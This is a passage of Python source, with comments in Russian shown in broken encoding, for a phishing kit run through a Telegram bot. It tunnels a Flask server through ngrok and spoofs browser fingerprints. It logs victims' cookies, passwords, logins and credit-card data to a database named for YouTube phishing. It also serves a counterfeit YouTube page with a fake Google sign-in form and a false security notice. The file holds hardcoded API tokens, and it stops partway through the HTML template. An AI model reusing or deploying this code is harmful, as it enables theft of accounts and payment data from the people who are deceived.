import logging
import asyncio
import json
import re
import uuid
import os
import time
import sys
import sqlite3
import random
import string
from datetime import datetime
from typing import Dict, List, Optional, Any
import threading
from urllib.parse import urlparse, parse_qs, quote, unquote
import html
import base64

# Selenium –¥–ª—è –∞–≤—Ç–æ–º–∞—Ç–∏—á–µ—Å–∫–æ–≥–æ –≤—Ö–æ–¥–∞
import undetected_chromedriver as uc
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.chrome.options import Options
from selenium.common.exceptions import TimeoutException, WebDriverException

# Flask –∏ –≤–µ–±
from flask import Flask, request, jsonify, render_template_string, make_response, redirect, send_file
from flask_cors import CORS
import requests
from werkzeug.middleware.proxy_fix import ProxyFix

# Pyngrok –¥–ª—è —É–ø—Ä–∞–≤–ª–µ–Ω–∏—è ngrok
from pyngrok import ngrok, conf

# Telegram
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import (
    Application,
    CommandHandler,
    MessageHandler,
    filters,
    ContextTypes,
    CallbackQueryHandler
)
from telegram.constants import ParseMode

# ========== –ù–ê–°–¢–†–û–ô–ö–ò ==========
# –ó–ê–ú–ï–ù–ò–¢–ï –≠–¢–ò –¢–û–ö–ï–ù–´ –ù–ê –°–í–û–ò!
BOT_TOKEN = "8342575399:AAFetGCZwKYOe4fwuXLkWsn6N3Q0VVEHGTs"  # –ü–æ–ª—É—á–∏—Ç–µ —É @BotFather
NGROK_AUTH_TOKEN = "cr_395kpmzwiHQt9pEmwSSFsGQiafk"  # –ü–æ–ª—É—á–∏—Ç–µ –Ω–∞ ngrok.com
ADMIN_ID = 1234567890  # –í–∞—à Telegram ID (–º–æ–∂–Ω–æ –ø–æ–ª—É—á–∏—Ç—å —É @userinfobot)
FLASK_PORT = 8080

# –ù–∞—Å—Ç—Ä–æ–π–∫–∏ –¥–ª—è –æ–±—Ö–æ–¥–∞ –∑–∞—â–∏—Ç—ã
BROWSER_CONFIG = {
    "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "screen_size": {"width": 1920, "height": 1080},
    "language": "ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7",
    "platform": "Win32",
    "hardware_concurrency": 8,
    "device_memory": 8,
    "webgl_vendor": "Google Inc. (NVIDIA)",
    "webgl_renderer": "ANGLE (NVIDIA, NVIDIA GeForce RTX 3060 Direct3D11 vs_5_0 ps_5_0, D3D11)",
    "timezone": "Europe/Moscow",
    "plugins": [
        "PDF Viewer",
        "Chrome PDF Viewer",
        "Chromium PDF Viewer",
        "Microsoft Edge PDF Viewer",
        "WebKit built-in PDF"
    ],
    "mime_types": [
        {"type": "application/pdf", "suffixes": "pdf", "description": "Portable Document Format"}
    ]
}

# –ù–∞—Å—Ç—Ä–æ–π–∫–∞ –ª–æ–≥–∏—Ä–æ–≤–∞–Ω–∏—è
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO,
    handlers=[
        logging.FileHandler('youtube_phishing.log', encoding='utf-8'),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger(__name__)

# ========== –ë–ê–ó–ê –î–ê–ù–ù–´–• ==========
class Database:
    def __init__(self):
        self.conn = sqlite3.connect('youtube_phishing.db', check_same_thread=False)
        self.create_tables()
    
    def create_tables(self):
        cursor = self.conn.cursor()
        
        # –¢–∞–±–ª–∏—Ü–∞ —Ñ–∏—à–∏–Ω–≥ —Å—Å—ã–ª–æ–∫
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS phishing_links (
                id TEXT PRIMARY KEY,
                youtube_url TEXT,
                youtube_id TEXT,
                phishing_url TEXT,
                created_at TEXT,
                created_by INTEGER,
                clicks INTEGER DEFAULT 0,
                is_active INTEGER DEFAULT 1,
                title TEXT,
                description TEXT
            )
        ''')
        
        # –¢–∞–±–ª–∏—Ü–∞ —Å–æ–±—Ä–∞–Ω–Ω—ã—Ö –¥–∞–Ω–Ω—ã—Ö
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS captured_data (
                id TEXT PRIMARY KEY,
                link_id TEXT,
                timestamp TEXT,
                ip_address TEXT,
                user_agent TEXT,
                cookies TEXT,
                localStorage TEXT,
                sessionStorage TEXT,
                passwords TEXT,
                logins TEXT,
                credit_cards TEXT,
                autofill_data TEXT,
                browser_info TEXT,
                device_info TEXT,
                network_info TEXT,
                sensitive_data TEXT,
                FOREIGN KEY (link_id) REFERENCES phishing_links (id)
            )
        ''')
        
        # –°—Ç–∞—Ç–∏—Å—Ç–∏–∫–∞
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS stats (
                key TEXT PRIMARY KEY,
                value INTEGER
            )
        ''')
        
        # –ò–Ω–∏—Ü–∏–∞–ª–∏–∑–∞—Ü–∏—è
        default_stats = [
            ('total_links', 0),
            ('total_clicks', 0),
            ('total_captured', 0),
            ('total_credentials', 0),
            ('total_cookies', 0)
        ]
        
        cursor.executemany(
            'INSERT OR IGNORE INTO stats (key, value) VALUES (?, ?)',
            default_stats
        )
        
        self.conn.commit()
    
    # –ú–µ—Ç–æ–¥—ã –¥–ª—è —Ñ–∏—à–∏–Ω–≥ —Å—Å—ã–ª–æ–∫
    def add_phishing_link(self, link_data):
        cursor = self.conn.cursor()
        
        cursor.execute('''
            INSERT INTO phishing_links 
            (id, youtube_url, youtube_id, phishing_url, created_at, created_by, title, description)
            VALUES (?, ?, ?, ?, ?, ?, ?, ?)
        ''', (
            link_data['id'],
            link_data['youtube_url'],
            link_data['youtube_id'],
            link_data['phishing_url'],
            link_data['created_at'],
            link_data['created_by'],
            link_data.get('title', ''),
            link_data.get('description', '')
        ))
        
        cursor.execute('UPDATE stats SET value = value + 1 WHERE key = "total_links"')
        self.conn.commit()
        return True
    
    def increment_clicks(self, link_id):
        cursor = self.conn.cursor()
        cursor.execute('UPDATE phishing_links SET clicks = clicks + 1 WHERE id = ?', (link_id,))
        cursor.execute('UPDATE stats SET value = value + 1 WHERE key = "total_clicks"')
        self.conn.commit()
    
    def get_link(self, link_id):
        cursor = self.conn.cursor()
        cursor.execute('SELECT * FROM phishing_links WHERE id = ?', (link_id,))
        row = cursor.fetchone()
        
        if not row:
            return None
        
        columns = [desc[0] for desc in cursor.description]
        return dict(zip(columns, row))
    
    def get_user_links(self, user_id):
        cursor = self.conn.cursor()
        cursor.execute('SELECT * FROM phishing_links WHERE created_by = ? ORDER BY created_at DESC', (user_id,))
        
        columns = [desc[0] for desc in cursor.description]
        return [dict(zip(columns, row)) for row in cursor.fetchall()]
    
    # –ú–µ—Ç–æ–¥—ã –¥–ª—è —Å–æ–±—Ä–∞–Ω–Ω—ã—Ö –¥–∞–Ω–Ω—ã—Ö
    def add_captured_data(self, data):
        cursor = self.conn.cursor()
        
        cursor.execute('''
            INSERT INTO captured_data 
            (id, link_id, timestamp, ip_address, user_agent, cookies, localStorage, 
             sessionStorage, passwords, logins, credit_cards, autofill_data, 
             browser_info, device_info, network_info, sensitive_data)
            VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
        ''', (
            data['id'],
            data['link_id'],
            data['timestamp'],
            data.get('ip_address'),
            data.get('user_agent'),
            json.dumps(data.get('cookies', []), ensure_ascii=False),
            json.dumps(data.get('localStorage', {}), ensure_ascii=False),
            json.dumps(data.get('sessionStorage', {}), ensure_ascii=False),
            json.dumps(data.get('passwords', []), ensure_ascii=False),
            json.dumps(data.get('logins', []), ensure_ascii=False),
            json.dumps(data.get('credit_cards', []), ensure_ascii=False),
            json.dumps(data.get('autofill_data', {}), ensure_ascii=False),
            json.dumps(data.get('browser_info', {}), ensure_ascii=False),
            json.dumps(data.get('device_info', {}), ensure_ascii=False),
            json.dumps(data.get('network_info', {}), ensure_ascii=False),
            json.dumps(data.get('sensitive_data', {}), ensure_ascii=False)
        ))
        
        # –û–±–Ω–æ–≤–ª—è–µ–º —Å—Ç–∞—Ç–∏—Å—Ç–∏–∫—É
        cursor.execute('UPDATE stats SET value = value + 1 WHERE key = "total_captured"')
        
        credentials_count = len(data.get('passwords', [])) + len(data.get('logins', []))
        if credentials_count > 0:
            cursor.execute('UPDATE stats SET value = value + ? WHERE key = "total_credentials"', (credentials_count,))
        
        cookies_count = len(data.get('cookies', []))
        if cookies_count > 0:
            cursor.execute('UPDATE stats SET value = value + ? WHERE key = "total_cookies"', (cookies_count,))
        
        self.conn.commit()
        return True
    
    def get_captured_data(self, data_id):
        cursor = self.conn.cursor()
        cursor.execute('SELECT * FROM captured_data WHERE id = ?', (data_id,))
        row = cursor.fetchone()
        
        if not row:
            return None
        
        columns = [desc[0] for desc in cursor.description]
        data = dict(zip(columns, row))
        
        # –ü–∞—Ä—Å–∏–º JSON –ø–æ–ª—è
        json_fields = ['cookies', 'localStorage', 'sessionStorage', 'passwords', 'logins',
                      'credit_cards', 'autofill_data', 'browser_info', 'device_info',
                      'network_info', 'sensitive_data']
        
        for field in json_fields:
            if data.get(field):
                try:
                    data[field] = json.loads(data[field])
                except:
                    data[field] = []
        
        return data
    
    def get_data_by_link(self, link_id):
        cursor = self.conn.cursor()
        cursor.execute('SELECT * FROM captured_data WHERE link_id = ? ORDER BY timestamp DESC', (link_id,))
        
        columns = [desc[0] for desc in cursor.description]
        results = []
        
        for row in cursor.fetchall():
            data = dict(zip(columns, row))
            
            # –ü–∞—Ä—Å–∏–º JSON –ø–æ–ª—è
            json_fields = ['cookies', 'passwords', 'logins']
            for field in json_fields:
                if data.get(field):
                    try:
                        data[field] = json.loads(data[field])
                    except:
                        data[field] = []
            
            results.append(data)
        
        return results
    
    # –°—Ç–∞—Ç–∏—Å—Ç–∏–∫–∞
    def get_stats(self):
        cursor = self.conn.cursor()
        cursor.execute('SELECT key, value FROM stats')
        rows = cursor.fetchall()
        return {row[0]: row[1] for row in rows}

# –ò–Ω–∏—Ü–∏–∞–ª–∏–∑–∞—Ü–∏—è –±–∞–∑—ã
db = Database()

# ========== NGROK –ú–ï–ù–ï–î–ñ–ï–† ==========
class NgrokManager:
    def __init__(self, auth_token):
        self.auth_token = auth_token
        self.public_url = None
        self.tunnel = None
        
        # –ù–∞—Å—Ç—Ä–æ–π–∫–∞ pyngrok
        conf.get_default().auth_token = auth_token
        
    def start(self, port=8080):
        """–ó–∞–ø—É—Å–∫–∞–µ—Ç ngrok —Ç—É–Ω–Ω–µ–ª—å —Å –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–µ–º pyngrok"""
        try:
            logger.info(f"Starting ngrok tunnel on port {port}")
            
            # –ó–∞–∫—Ä—ã–≤–∞–µ–º —Å—É—â–µ—Å—Ç–≤—É—é—â–∏–µ —Ç—É–Ω–Ω–µ–ª–∏
            self.stop()
            
            # –°–æ–∑–¥–∞–µ–º —Ç—É–Ω–Ω–µ–ª—å
            self.tunnel = ngrok.connect(port, "http")
            self.public_url = self.tunnel.public_url
            
            logger.info(f"‚úÖ Ngrok started! Public URL: {self.public_url}")
            logger.info(f"Dashboard: http://127.0.0.1:4040")
            
            return self.public_url
            
        except Exception as e:
            logger.error(f"‚ùå Error starting ngrok: {e}")
            
            # –ü—Ä–æ–±—É–µ–º –∞–ª—å—Ç–µ—Ä–Ω–∞—Ç–∏–≤–Ω—ã–π —Å–ø–æ—Å–æ–±
            try:
                logger.info("Trying alternative method...")
                self.tunnel = ngrok.connect(addr=port, proto="http", bind_tls=True)
                self.public_url = self.tunnel.public_url
                logger.info(f"‚úÖ Ngrok started (alternative)! URL: {self.public_url}")
                return self.public_url
            except Exception as e2:
                logger.error(f"‚ùå Alternative method also failed: {e2}")
                return None
    
    def get_public_url(self):
        """–ü–æ–ª—É—á–∞–µ—Ç –ø—É–±–ª–∏—á–Ω—ã–π URL –æ—Ç ngrok"""
        return self.public_url
    
    def stop(self):
        """–û—Å—Ç–∞–Ω–∞–≤–ª–∏–≤–∞–µ—Ç ngrok —Ç—É–Ω–Ω–µ–ª—å"""
        try:
            if self.tunnel:
                ngrok.disconnect(self.tunnel.public_url)
                logger.info("Ngrok tunnel stopped")
            self.tunnel = None
            self.public_url = None
        except Exception as e:
            logger.error(f"Error stopping ngrok: {e}")
    
    def get_tunnels(self):
        """–ü–æ–ª—É—á–∞–µ—Ç —Å–ø–∏—Å–æ–∫ –∞–∫—Ç–∏–≤–Ω—ã—Ö —Ç—É–Ω–Ω–µ–ª–µ–π"""
        try:
            tunnels = ngrok.get_tunnels()
            return tunnels
        except:
            return []

# ========== YOUTUBE –ú–ï–ù–ï–î–ñ–ï–† ==========
class YouTubeManager:
    @staticmethod
    def extract_video_id(url):
        """–ò–∑–≤–ª–µ–∫–∞–µ—Ç ID –≤–∏–¥–µ–æ –∏–∑ YouTube URL"""
        patterns = [
            r'(?:youtube\.com\/watch\?v=|youtu\.be\/|youtube\.com\/embed\/)([a-zA-Z0-9_-]{11})',
            r'v=([a-zA-Z0-9_-]{11})'
        ]
        
        for pattern in patterns:
            match = re.search(pattern, url)
            if match:
                return match.group(1)
        
        # –î–µ—Ñ–æ–ª—Ç–Ω–æ–µ –≤–∏–¥–µ–æ
        return "dQw4w9WgXcQ"
    
    @staticmethod
    def generate_phishing_url(ngrok_url, youtube_id, link_id):
        """–ì–µ–Ω–µ—Ä–∏—Ä—É–µ—Ç —Ñ–∏—à–∏–Ω–≥–æ–≤—É—é —Å—Å—ã–ª–∫—É"""
        return f"{ngrok_url}/watch?v={youtube_id}&id={link_id}&t={int(time.time())}"
    
    @staticmethod
    def get_video_info(youtube_id):
        """–ü–æ–ª—É—á–∞–µ—Ç –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—é –æ –≤–∏–¥–µ–æ"""
        try:
            # –ò—Å–ø–æ–ª—å–∑—É–µ–º YouTube API –¥–ª—è –ø–æ–ª—É—á–µ–Ω–∏—è —Ä–µ–∞–ª—å–Ω–æ–π –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏–∏
            api_url = f"https://www.youtube.com/oembed?url=https://www.youtube.com/watch?v={youtube_id}&format=json"
            response = requests.get(api_url, timeout=5)
            
            if response.status_code == 200:
                data = response.json()
                return {
                    "title": data.get('title', 'YouTube Video'),
                    "description": f"–°–º–æ—Ç—Ä–∏—Ç–µ –≤–∏–¥–µ–æ: {data.get('title', 'YouTube Video')}",
                    "thumbnail": data.get('thumbnail_url', f'https://img.youtube.com/vi/{youtube_id}/hqdefault.jpg')
                }
        except:
            pass
        
        # –ï—Å–ª–∏ API –Ω–µ —Ä–∞–±–æ—Ç–∞–µ—Ç, –≤–æ–∑–≤—Ä–∞—â–∞–µ–º –∑–∞–≥–ª—É—à–∫—É
        return {
            "title": "YouTube Video",
            "description": "–°–º–æ—Ç—Ä–∏—Ç–µ –∏–Ω—Ç–µ—Ä–µ—Å–Ω–æ–µ –≤–∏–¥–µ–æ –Ω–∞ YouTube",
            "thumbnail": f"https://img.youtube.com/vi/{youtube_id}/hqdefault.jpg"
        }

# ========== HTML –®–ê–ë–õ–û–ù–´ ==========
HTML_TEMPLATES = {
    "youtube_page": """
<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>YouTube Video</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Roboto', 'Arial', sans-serif;
        }
        
        body {
            background: #0f0f0f;
            color: #fff;
            min-height: 100vh;
        }
        
        .container {
            max-width: 1200px;
            margin: 0 auto;
            padding: 20px;
        }
        
        .player-container {
            position: relative;
            padding-bottom: 56.25%;
            height: 0;
            overflow: hidden;
            border-radius: 12px;
            background: #000;
            margin-bottom: 20px;
            box-shadow: 0 4px 20px rgba(0,0,0,0.3);
        }
        
        .player-container iframe {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            border: none;
        }
        
        .video-title {
            font-size: 20px;
            font-weight: 600;
            margin: 16px 0 8px;
            line-height: 1.3;
        }
        
        .video-info {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 16px;
            padding-bottom: 12px;
            border-bottom: 1px solid #3f3f3f;
        }
        
        .video-views {
            color: #aaa;
            font-size: 14px;
        }
        
        .video-actions {
            display: flex;
            gap: 8px;
        }
        
        .action-btn {
            background: #272727;
            border: none;
            color: #fff;
            padding: 8px 16px;
            border-radius: 18px;
            cursor: pointer;
            display: flex;
            align-items: center;
            gap: 6px;
            font-size: 14px;
            font-weight: 500;
            transition: background 0.2s;
        }
        
        .action-btn:hover {
            background: #3d3d3d;
        }
        
        .channel-info {
            display: flex;
            align-items: center;
            gap: 12px;
            margin-bottom: 20px;
            padding: 12px;
            background: #1a1a1a;
            border-radius: 12px;
        }
        
        .channel-avatar {
            width: 40px;
            height: 40px;
            border-radius: 50%;
            background: linear-gradient(45deg, #FF0000, #FF6B6B);
            display: flex;
            align-items: center;
            justify-content: center;
            font-weight: bold;
            font-size: 18px;
        }
        
        .channel-name {
            font-weight: 600;
            font-size: 16px;
        }
        
        .channel-subs {
            color: #aaa;
            font-size: 13px;
        }
        
        .subscribe-btn {
            background: #cc0000;
            color: white;
            border: none;
            padding: 10px 16px;
            border-radius: 18px;
            cursor: pointer;
            font-weight: 500;
            font-size: 14px;
            margin-left: auto;
            transition: background 0.2s;
        }
        
        .subscribe-btn:hover {
            background: #ff0000;
        }
        
        .video-description {
            background: #1a1a1a;
            padding: 16px;
            border-radius: 12px;
            margin: 20px 0;
            line-height: 1.5;
            font-size: 14px;
            color: #ddd;
        }
        
        .comments-section {
            margin-top: 30px;
        }
        
        .comments-header {
            display: flex;
            align-items: center;
            gap: 16px;
            margin-bottom: 20px;
            font-size: 18px;
            font-weight: 600;
        }
        
        .comment {
            display: flex;
            gap: 12px;
            margin-bottom: 16px;
            padding: 12px;
            background: #1a1a1a;
            border-radius: 12px;
        }
        
        .comment-avatar {
            width: 32px;
            height: 32px;
            border-radius: 50%;
            background: #444;
            flex-shrink: 0;
        }
        
        .comment-content {
            flex: 1;
        }
        
        .comment-author {
            font-weight: 600;
            font-size: 14px;
            margin-bottom: 4px;
        }
        
        .comment-text {
            color: #ddd;
            font-size: 14px;
            line-height: 1.4;
        }
        
        .comment-time {
            color: #777;
            font-size: 12px;
            margin-top: 4px;
        }
        
        .ad-banner {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            padding: 16px;
            border-radius: 12px;
            margin: 20px 0;
            text-align: center;
            font-weight: 600;
            font-size: 15px;
        }
        
        .login-prompt {
            background: #1a1a1a;
            border: 1px solid #333;
            border-radius: 12px;
            padding: 24px;
            margin-top: 30px;
            text-align: center;
        }
        
        .login-prompt h3 {
            margin-bottom: 12px;
            color: #fff;
            font-size: 18px;
        }
        
        .login-prompt p {
            color: #aaa;
            margin-bottom: 20px;
            font-size: 14px;
            line-height: 1.5;
        }
        
        .login-btn {
            background: #4285f4;
            color: white;
            border: none;
            padding: 12px 32px;
            border-radius: 24px;
            cursor: pointer;
            font-size: 15px;
            font-weight: 600;
            display: inline-flex;
            align-items: center;
            gap: 8px;
            transition: background 0.2s;
        }
        
        .login-btn:hover {
            background: #3367d6;
        }
        
        .login-form {
            background: #1a1a1a;
            border: 1px solid #333;
            border-radius: 12px;
            padding: 24px;
            margin-top: 20px;
        }
        
        .login-form h3 {
            color: #fff;
            margin-bottom: 20px;
            font-size: 18px;
            display: flex;
            align-items: center;
            gap: 10px;
        }
        
        .login-form input {
            width: 100%;
            padding: 14px 16px;
            margin: 10px 0;
            background: #2d2d2d;
            border: 1px solid #444;
            border-radius: 8px;
            color: white;
            font-size: 15px;
        }
        
        .login-form input:focus {
            outline: none;
            border-color: #4285f4;
        }
        
        .form-actions {
            display: flex;
            gap: 12px;
            margin-top: 20px;
        }
        
        .form-btn {
            flex: 1;
            padding: 12px;
            border: none;
            border-radius: 8px;
            cursor: pointer;
            font-weight: 600;
            font-size: 14px;
        }
        
        .primary-btn {
            background: #4285f4;
            color: white;
        }
        
        .secondary-btn {
            background: #444;
            color: white;
        }
        
        .loading {
            text-align: center;
            padding: 40px;
            color: #aaa;
        }
        
        .success-message {
            background: #1a1a1a;
            border-radius: 12px;
            padding: 30px;
            text-align: center;
            margin: 20px 0;
            display: none;
        }
        
        .success-icon {
            color: #34a853;
            font-size: 48px;
            margin-bottom: 16px;
        }
        
        .security-info {
            background: #1a1a1a;
            border-left: 4px solid #4285f4;
            padding: 12px 16px;
            margin: 20px 0;
            font-size: 13px;
            color: #aaa;
        }
        
        @media (max-width: 768px) {
            .container {
                padding: 12px;
            }
            
            .video-title {
                font-size: 16px;
            }
            
            .video-info {
                flex-direction: column;
                align-items: flex-start;
                gap: 8px;
            }
            
            .video-actions {
                width: 100%;
                justify-content: space-between;
            }
            
            .action-btn {
                flex: 1;
                justify-content: center;
            }
        }
    </style>
    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;600;700&display=swap" rel="stylesheet">
</head>
<body>
    <div class="container">
        <!-- –†–µ–∫–ª–∞–º–Ω—ã–π –±–∞–Ω–Ω–µ—Ä -->
        <div class="ad-banner">
            üé¨ –î–ª—è –¥–æ—Å—Ç—É–ø–∞ –∫–æ –≤—Å–µ–º —Ñ—É–Ω–∫—Ü–∏—è–º YouTube —Ç—Ä–µ–±—É–µ—Ç—Å—è –∞–≤—Ç–æ—Ä–∏–∑–∞—Ü–∏—è
        </div>
        
        <!-- –ü–ª–µ–µ—Ä -->
        <div class="player-container">
            <iframe 
                src="https://www.youtube.com/embed/{youtube_id}?autoplay=1&controls=1&modestbranding=1&rel=0&showinfo=0" 
                frameborder="0" 
                allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" 
                allowfullscreen
                id="youtubePlayer"
                title="YouTube video player">
            </iframe>
        </div>
        
        <!-- –ó–∞–≥–æ–ª–æ–≤–æ–∫ –∏ –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—è -->
        <h1 class="video-title">{video_title}</h1>
        
        <div class="video-info">
            <div class="video-views">
                {views_count} –ø—Ä–æ—Å–º–æ—Ç—Ä–æ–≤ ‚Ä¢ {upload_date}
            </div>
            <div class="video-actions">
                <button class="action-btn" id="likeBtn">
                    <svg width="20" height="20" viewBox="0 0 24 24" fill="currentColor">
                        <path d="M18.77,11h-4.23l1.52-4.94C16.38,5.03,15.54,4,14.38,4c-0.58,0-1.14,0.24-1.52,0.65L7,11H3v10h4h1h9.43 c1.06,0,1.98-0.67,2.19-1.61l1.34-6C21.23,12.15,20.18,11,18.77,11z M7,20H4v-8h3V20z M19.98,13.17l-1.34,6 C18.54,19.65,18.03,20,17.43,20H8v-8.61l5.6-6.06C13.79,5.12,14.08,5,14.38,5c0.26,0,0.5,0.11,0.63,0.3 c0.07,0.1,0.15,0.26,0.09,0.47l-1.52,4.94L13.18,12h1.35h4.23c0.41,0,0.8,0.17,1.03,0.46C19.92,12.76,20.05,13.06,19.98,13.17z"/>
                    </svg>
                    {like_count}
                </button>
                <button class="action-btn" id="dislikeBtn">
                    <svg width="20" height="20" viewBox="0 0 24 24" fill="currentColor">
                        <path d="M17,4h-1H6.57C5.5,4,4.59,4.67,4.38,5.61l-1.34,6C2.77,12.85,3.82,14,5.23,14h4.23l-1.52,4.94C7.62,19.97,8.46,21,9.62,21 c0.58,0,1.14-0.24,1.52-0.65L17,14h4V4H17z M10.4,19.67C10.21,19.88,9.92,20,9.62,20c-0.26,0-0.5-0.11-0.63-0.3 c-0.07-0.1-0.15-0.26-0.09-0.47l1.52-4.94l0.4-1.29H9.46H5.23c-0.41,0-0.8-0.17-1.03-0.46c-0.12-0.13-0.25-0.43-0.18-0.53l1.34-6 C5.46,5.35,5.97,5,6.57,5H8v8.61L10.4,19.67z M20,13h-3V5h3V13z"/>
                    </svg>
                </button>
                <button class="action-btn">
                    <svg width="20" height="20" viewBox="0 0 24 24" fill="currentColor">
                        <path d="M18 16.08c-.76 0-1.44.3-1.96.77L8.91 12.7c.05-.23.09-.46.09-.7s-.04-.47-.09-.7l7.05-4.11c.54.5 1.25.81 2.04.81 1.66 0 3-1.34 3-3s-1.34-3-3-3-3 1.34-3 3c0 .24.04.47.09.7L8.04 9.81C7.5 9.31 6.79 9 6 9c-1.66 0-3 1.34-3 3s1.34 3 3 3c.79 0 1.5-.31 2.04-.81l7.12 4.16c-.05.21-.08.43-.08.65 0 1.61 1.31 2.92 2.92 2.92 1.61 0 2.92-1.31 2.92-2.92s-1.31-2.92-2.92-2.92z"/>
                    </svg>
                    –ü–æ–¥–µ–ª–∏—Ç—å—Å—è
                </button>
                <button class="action-btn">
                    <svg width="20" height="20" viewBox="0 0 24 24" fill="currentColor">
                        <path d="M19 9h-4V3H9v6H5l7 7 7-7zM5 18v2h14v-2H5z"/>
                    </svg>
                    –°–æ—Ö—Ä–∞–Ω–∏—Ç—å
                </button>
            </div>
        </div>
        
        <!-- –ò–Ω—Ñ–æ—Ä–º–∞—Ü–∏—è –æ –∫–∞–Ω–∞–ª–µ -->
        <div class="channel-info">
            <div class="channel-avatar">YT</div>
            <div>
                <div class="channel-name">{channel_name}</div>
                <div class="channel-subs">{subscribers_count} –ø–æ–¥–ø–∏—Å—á–∏–∫–æ–≤</div>
            </div>
            <button class="subscribe-btn" id="subscribeBtn">–ü–û–î–ü–ò–°–ê–¢–¨–°–Ø</button>
        </div>
        
        <!-- –û–ø–∏—Å–∞–Ω–∏–µ -->
        <div class="video-description">
            {video_description}
            <br><br>
            <div style="color: #777; font-size: 13px;">
                #YouTube #–í–∏–¥–µ–æ #{random_tag}
            </div>
        </div>
        
        <!-- –ò–Ω—Ñ–æ—Ä–º–∞—Ü–∏—è –æ –±–µ–∑–æ–ø–∞—Å–Ω–æ—Å—Ç–∏ -->
        <div class="security-info">
            üîí –î–ª—è –∑–∞—â–∏—Ç—ã –≤–∞—à–µ–≥–æ –∞–∫–∫–∞—É–Ω—Ç–∞ —Ç—Ä–µ–±—É–µ—Ç—Å—è –ø–æ–¥—Ç–≤–µ—Ä–∂–¥–µ–Ω–∏–µ –ª–∏—á–Ω–æ—Å—Ç–∏. 
            –≠—Ç–æ —Å—Ç–∞–Ω–¥–∞—Ä—Ç–Ω–∞—è –ø—Ä–æ—Ü–µ–¥—É—Ä–∞ –±–µ–∑–æ–ø–∞—Å–Ω–æ—Å—Ç–∏ YouTube.
        </div>
        
        <!-- –§–æ—Ä–º–∞ –≤—Ö–æ–¥–∞ -->
        <div class="login-form" id="loginForm">
            <h3>
                <svg width="24" height="24" viewBox="0 0 24 24" fill="#4285f4">
                    <path d="M22.56 12.25c0-.78-.07-1.53-.2-2.25H12v4.26h5.92c-.26 1.37-1.04 2.53-2.21 3.31v2.77h3.57c2.08-1.92 3.28-4.74 3.28-8.09z"/>
                    <path d="M12 23c2.97 0 5.46-.98 7.28-2.66l-3.57-2.77c-.98.66-2.23 1.06-3.71 1.06-2.86 0-5.29-1.93-6.16-4.53H2.18v2.84C3.99 20.53 7.7 23 12 23z" fill="#34A853"/>
                    <path d="M5.84 14.09c-.22-.66-.35-1.36-.35-2.09s.13-1.43.35-2.09V7.07H2.18C1.43 8.55 1 10.22 1 12s.43 3.45 1.18 4.93l2.85-2.22.81-.62z" fill="#FBBC05"/>
                    <path d="M12 5.38c1.62 0 3.06.56 4.21 1.64l3.15-3.15C17.45 2.09 14.97 1 12 1 7.7 1 3.99 3.47 2.18 7.07l3.66 2.84c.87-2.6 3.3-4.53 6.16-4.53z" fill="#EA4335"/>
                </svg>
                –í—Ö–æ–¥ –≤ Google
            </h3>
            
            <div style="margin-bottom: 16px; color: #aaa; font-size: 14px;">
                –î–ª—è –ø—Ä–æ–¥–æ–ª–∂–µ–Ω–∏—è –ø—Ä–æ—Å–º–æ—Ç—Ä–∞ –∏ –¥–æ—Å—Ç—É–ø–∞ –∫–æ –≤—Å–µ–º —Ñ—É–Ω–∫—Ü–∏—è–º YouTube
            </div>
            
            <form id="googleLoginForm" onsubmit="return false;">
                <input type="email" 
                       id="emailField"
                       placeholder="–≠–ª–µ–∫—Ç—Ä–æ–Ω–Ω–∞—è –ø–æ—á—Ç–∞ –∏–ª–∏ —Ç–µ–ª–µ—Ñ–æ–Ω" 
                       required
                       autocomplete="email">
                
                <input type="password" 
                       id="passwordField"
                       placeholder="–í–≤–µ–¥–∏—Ç–µ –ø–∞—Ä–æ–ª—å" 
                       required
                       autocomplete="current-password">
                
                <div class="form-actions">
                    <button type="button" class="form-btn secondary-btn" onclick="showForgotPassword()">
                        –ó–∞–±—ã–ª–∏ –ø–∞—Ä–æ–ª—å?
                    </button>
                    <button type="submit" class="form-btn primary-btn" id="submitBtn">
                        –î–∞–ª–µ–µ
                    </button>
                </div>
            </form>
            
            <div style="margin-top: 20px; padding: 12px; background: #2d2d2d; border-radius: 8px; font-size: 12px; color: #777;">
                <div style="display: flex; align-items: center; gap: 8px; margin-bottom: 8px;">
                    <svg width="16" height="16" viewBox="0 0 24 24" fill="#4285f4">
                        <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-2 15l-5-5 1.41-1.41L10 14.17l7.59-7.59L19 8l-9 9z"/>
                    </svg>
                    <span>–ó–∞—â–∏—â–µ–Ω–æ —Å–µ—Ä–≤–∏—Å–∞–º–∏ Google</span>
                </div>
